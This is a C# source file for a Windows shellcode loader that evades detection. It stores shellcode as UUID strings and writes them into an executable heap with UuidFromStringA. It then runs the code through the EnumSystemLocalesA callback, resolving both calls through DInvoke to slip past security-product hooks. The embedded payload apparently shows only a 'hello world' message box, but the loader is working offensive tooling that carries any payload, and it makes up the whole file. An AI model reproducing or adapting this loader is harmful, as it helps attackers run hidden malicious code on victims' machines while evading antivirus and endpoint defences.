using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using DInvoke;

namespace UuidShellcode
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize,UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = false)]static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);
        static void Main(string[] args)
        {
            var HeapCreateHandle = HeapCreate((uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero);
            var heapAddr = HeapAlloc(HeapCreateHandle, (uint)0, (uint)0x100000);

            string[] uuids =
{
                "e48148fc-fff0-ffff-e8d0-000000415141",
                "56515250-3148-65d2-488b-52603e488b52",
                "8b483e18-2052-483e-8b72-503e480fb74a",
                "c9314d4a-3148-acc0-3c61-7c022c2041c1",
                "01410dc9-e2c1-52ed-4151-3e488b52203e",
                "483c428b-d001-8b3e-8088-0000004885c0",
                "01486f74-50d0-8b3e-4818-3e448b402049",
                "5ce3d001-ff48-3ec9-418b-34884801d64d",
                "3148c931-acc0-c141-c90d-4101c138e075",
                "034c3ef1-244c-4508-39d1-75d6583e448b",
                "01492440-66d0-413e-8b0c-483e448b401c",
                "3ed00149-8b41-8804-4801-d0415841585e",
                "58415a59-5941-5a41-4883-ec204152ffe0",
                "5a594158-483e-128b-e949-ffffff5d49c7",
                "000000c1-3e00-8d48-95fe-0000003e4c8d",
                "00010a85-4800-c931-41ba-45835607ffd5",
                "41c93148-f0ba-a2b5-56ff-d568656c6c6f",
                "726f7720-646c-4d00-6573-73616765426f",
                "00000078-0000-0000-0000-000000000000"
            };

            IntPtr pkernel32 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr prpcrt4 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("rpcrt4.dll");
            IntPtr pEnumSystemLocalesA = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "EnumSystemLocalesA");
            IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");

            IntPtr newHeapAddr = IntPtr.Zero;
            for (int i = 0; i < uuids.Length; i++)
            {
                newHeapAddr = IntPtr.Add(HeapCreateHandle, 16 * i);
                object[] uuidFromStringAParam = { uuids[i], newHeapAddr };
                var status = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pUuidFromStringA, typeof(DELEGATE.UuidFromStringA), ref uuidFromStringAParam);
            }
    
            object[] enumSystemLocalesAParam = { HeapCreateHandle, 0 };
            var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);
        }
    }
    public class DELEGATE
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr UuidFromStringA(string StringUuid, IntPtr heapPointer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);
    }
}
